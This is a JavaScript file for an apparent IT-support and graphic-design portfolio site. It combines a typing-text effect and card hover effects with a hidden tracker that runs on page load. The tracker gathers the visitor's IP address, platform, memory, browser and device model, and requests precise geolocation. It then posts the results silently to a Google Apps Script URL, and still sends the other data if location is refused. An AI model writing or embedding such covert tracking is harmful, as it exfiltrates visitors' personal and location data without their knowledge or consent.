(async function() {
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby_uW_iHwY-kRtajj3N5aUTLqihoVLHM7zdr-6_CLkmRmJI834MQYvgP45PXOpm7wN6SA/exec"; 

  // --- 1. DETEKSI BROWSER LENGKAP ---
  const getBrowserInfo = () => {
    const ua = navigator.userAgent;
    let tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if(/trident/i.test(M[1])){
        tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return 'IE '+(tem[1] || '');
    }
    if(M[1]=== 'Chrome'){
        tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
        if(tem != null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
    }
    M = M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
    if((tem = ua.match(/version\/(\d+)/i))!= null) M.splice(1, 1, tem[1]);
    return M.join(' ');
  };

  // --- 2. DETEKSI IPHONE LENGKAP ---
  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    const w = window.screen.width;
    const h = window.screen.height;
    const r = window.devicePixelRatio;

    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      if ((w === 440 && h === 956) || (w === 430 && h === 932)) return "iPhone 15/16 Pro Max";
      if ((w === 402 && h === 874) || (w === 393 && h === 852)) return "iPhone 15/16 Pro";
      if (w === 393 && h === 852 && r === 3) return "iPhone 14 Pro / 15 / 16";
      if (w === 390 && h === 844) return "iPhone 12/13/14";
      if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
      if (w === 414 && h === 896 && r === 2) return "iPhone 11 / XR";
      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
      if (w === 375 && h === 812) return "iPhone X/XS/11Pro/mini";
      return "Apple iPhone";
    }
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    return navigator.platform;
  };

  const startTracker = async () => {
    let payload = {
      ip: "Checking...",
      platform: navigator.platform,
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
      browser: getBrowserInfo(), // DATA BROWSER
      deviceName: getDeviceModel(),
      lat: null, 
      long: null
    };

    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) { payload.ip = "Hidden/VPN"; }

    const send = (data) => {
      fetch(WEB_APP_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(data) });
    };

    // Jalankan Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        send(payload); 
      }, (err) => {
        send(payload); // Kirim tanpa lokasi jika ditolak
      }, { enableHighAccuracy: true });
    } else {
      send(payload);
    }
  };

  // --- 3. UI EFFECTS (TYPING & RIPPLE) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;
    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--; typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++; typingDelay = 150;
    }
    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000; isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }

  window.addEventListener('load', () => {
    startTracker();
    setTimeout(typeText, 1000);
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
